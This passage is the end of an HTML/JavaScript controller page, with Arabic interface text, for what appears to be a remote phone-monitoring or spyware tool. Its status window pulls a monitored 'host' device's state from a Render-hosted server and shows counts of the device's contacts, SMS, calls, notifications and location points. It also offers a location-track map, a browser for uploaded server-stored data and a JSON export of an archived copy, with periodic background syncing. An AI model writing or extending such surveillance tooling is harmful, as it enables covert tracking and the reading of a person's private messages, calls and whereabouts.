        // ذاكرة خادم Render (المرفوعة صندلما كان المضيف أونلاين والمتحكم غير متصل) + نسخة المتحكم المحلية.
        async function openHostStatusWindow(deviceId) {
            try {
                ensureStreamModalsShell();
                const el = document.getElementById('rb-host-snapshot-modal');
                el.classList.replace('hidden', 'flex');
                const rec = savedHosts.get(deviceId);
                const name = rec && rec.deviceName ? rec.deviceName : deviceId;
                el.innerHTML = `<div class="bg-slate-900 border border-slate-700 rounded-2xl p-6 text-sm text-slate-300">⏳ جارٍ جلب بيانات نافذة الحالة من خادم Render...</div>`;
                let snap = null;
                try {
                    const base = serverStateApiBase();
                    const res = await fetch(base + '/api/state?deviceId=' + encodeURIComponent(deviceId));
                    if (res.ok) snap = await res.json();
                } catch (_) {}
                const d = (snap && snap.data) || {};
                const lastTs = (snap && snap.ts) || d.lastSeen || (rec && rec.lastSeenAt) || 0;
                const lastSeen = lastTs ? recFmtDate(lastTs) : 'غير معروف';
                const battery = (snap && snap.batteryLevel !== undefined && snap.batteryLevel >= 0 ? snap.batteryLevel : (d.batteryLevel !== undefined ? d.batteryLevel : -1));
                const counts = {
                    contacts: (d.contacts || []).length,
                    sms: (d.sms || []).length,
                    calls: (d.calls || []).length,
                    notifications: (d.notifications || []).length,
                    location: (d.location || []).length
                };
                const snapEmpty = !snap || !snap.data || (!counts.contacts && !counts.sms && !counts.calls && !counts.notifications && !counts.location);
                const arch = deviceArchive.get(deviceId);
                const archCounts = (() => {
                    if (!arch || !arch.lists) return [];
                    return Object.keys(ARCH_LIST_LABELS).filter(k => arch.lists[k] && Array.isArray(arch.lists[k].items) && arch.lists[k].items.length)
                        .map(k => `${ARCH_LIST_LABELS[k][0]}${arch.lists[k].items.length}`).join(' ');
                })() || '';
                el.innerHTML = `
                    <div class="bg-slate-900 border border-slate-700 rounded-2xl p-4 w-full max-w-lg shadow-2xl max-h-[86vh] overflow-y-auto">
                        <div class="flex items-center justify-between mb-3">
                            <h3 class="text-sm font-bold text-emerald-300">🛡️ نافذة الحالة — ${escHtml(String(name))}</h3>
                            <button onclick="closeHostStatusWindow()" class="text-slate-400 hover:text-white text-lg px-2">✕</button>
                        </div>
                        <div class="text-xs text-slate-300 grid grid-cols-2 gap-2">
                            <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2">📅 آخر رؤية: <b>${lastSeen}</b></div>
                            <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2">🕒 وقت المنقضي: <b id="rb-sw-elapsed" class="ts-en">${lastTs ? fmtElapsedAr(Date.now() - lastTs) : '—'}</b></div>
                            <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2">🔋 البطارية: <b class="${battery <= 15 ? 'text-rose-300' : 'text-emerald-300'}">${battery >= 0 ? battery + '%' + (snap && (snap.isCharging || d.isCharging) ? ' ⚡' : '') : 'غير معروفة'}</b></div>
                            <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2">👥 جهات اتصال: <b>${counts.contacts}</b></div>
                            <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2">💬 رسائل: <b>${counts.sms}</b></div>
                            <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2">📞 مكالمات: <b>${counts.calls}</b></div>
                            <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2">🔔 إشعارات: <b>${counts.notifications}</b></div>
                            <div class="bg-slate-950/70 border border-slate-800 rounded-xl p-2">📍 نقاط المواقع: <b>${counts.location}</b></div>
                        </div>
                        ${snapEmpty ? `<p class="text-[10px] text-amber-300/80 mt-2">لا حالة مخزنة على الخادم بعد — يصل التحديث تلقائياً كل 3 دقائق أثناء عمل المضيف، وتبقى بيانات تصفح الملفات مخزنة في ذاكرة الخادم حتى بعد انقطاعه.</p>` : ''}
                        <div class="space-y-2 mt-3">
                            <button id="rb-sw-map" class="w-full bg-teal-700 hover:bg-teal-600 text-teal-50 text-xs font-bold py-2.5 rounded-xl transition">🗺️ مسار المواقع المخزن على الخادم</button>
                            <button id="rb-sw-blobs" class="w-full bg-purple-900/70 hover:bg-purple-800/90 text-purple-200 border border-purple-500/40 text-xs font-bold py-2.5 rounded-xl transition">🗂️ تصفح بيانات ذاكرة خادم Render (رُفعت أثناء اتصال المضيف وغير اتصال المتحكم)</button>
                            ${archCounts ? `
                            <div class="bg-emerald-950/40 border border-emerald-500/30 rounded-xl p-2.5">
                                <p class="text-[11px] text-emerald-200 font-bold">📁 نسخة محفوظة تلقائياً في ملفات المتحكم <span class="text-[9px] text-emerald-400/80 font-mono">(${archCounts})</span></p>
                                <p class="text-[9px] text-slate-400 mt-0.5">سُجلت أثناء جلسة اتصال المضيف والمتحكم معاً — <span class="ts-en">${fmtEnTime(arch.ts || 0)}</span></p>
                                <div class="flex gap-1.5 mt-1.5">
                                    <button id="rb-sw-arch" class="flex-1 bg-slate-800 hover:bg-slate-700 text-slate-200 text-[10px] font-bold py-1.5 rounded-lg px-2">👀 تصفح النسخة المحلية</button>
                                    <button id="rb-sw-arch-dl" class="bg-emerald-900/70 hover:bg-emerald-800 text-emerald-300 text-[10px] font-bold py-1.5 rounded-lg px-2">⬇️ تنزيل JSON</button>
                                </div>
                            </div>` : `<p class="text-[9px] text-slate-500 mt-1">أرشفة محلية: تُسجل نسخة القوائم تلقائياً في ملفات المتحكم عند اتصال المضيف والمتحكم بنفس الجلسة — للتصفح لاحقاً حتى بعد انقطاع الطرفين.</p>`}
                        </div>
                        <button onclick="closeHostStatusWindow()" class="w-full mt-3 bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-bold py-2.5 rounded-xl transition">إغلاق</button>
                    </div>`;
                rbStartStatusElapsed(lastTs);
                const mapBtn = el.querySelector('#rb-sw-map');
                if (mapBtn) mapBtn.addEventListener('click', () => {
                    closeHostStatusWindow();
                    setTimeout(() => openLocationMapView(Object.keys(counts).some(k => counts[k] > 0) ? d : undefined), 60);
                });
                const blobsBtn = el.querySelector('#rb-sw-blobs');
                if (blobsBtn) blobsBtn.addEventListener('click', () => {
                    closeHostStatusWindow();
                    setTimeout(() => openVaultBlobsPanel(deviceId).catch(() => {}), 60);
                });
                const archBtn = el.querySelector('#rb-sw-arch');
                if (archBtn) archBtn.addEventListener('click', () => {
                    closeHostStatusWindow();
                    setTimeout(() => renderDeviceArchivePanel(deviceId), 60);
                });
                const archDl = el.querySelector('#rb-sw-arch-dl');
                if (archDl) archDl.addEventListener('click', () => downloadDeviceArchiveJson(deviceId));
            } catch (_) {
                try {
                    const el = document.getElementById('rb-host-snapshot-modal');
                    if (el) el.classList.replace('flex', 'hidden');
                    showToast('تعذر فتح نافذة الحالة', 'error');
                } catch (__) {}
            }
        }

        function closeHostStatusWindow() {
            closeHostSnapshotModal();
        }

        // توافق خلفي: زر «الحالة» القديم إن وُجد يستدعي نفس نافذة الحالة
        function openHostSnapshotModal(deviceId) {
            try { return openHostStatusWindow(deviceId); } catch (_) {}
        }

        function closeHostSnapshotModal() {
            const el = document.getElementById('rb-host-snapshot-modal');
            if (el) el.classList.replace('flex', 'hidden');
        }

        // ——— التمهيد: استرجاع/تزامن دوري ———
        setTimeout(() => { restoreControllerStateOnce(); postControllerStateOnce(); }, 4000);
        setInterval(postControllerStateOnce, 60000);
    </script>
</body>
</html>
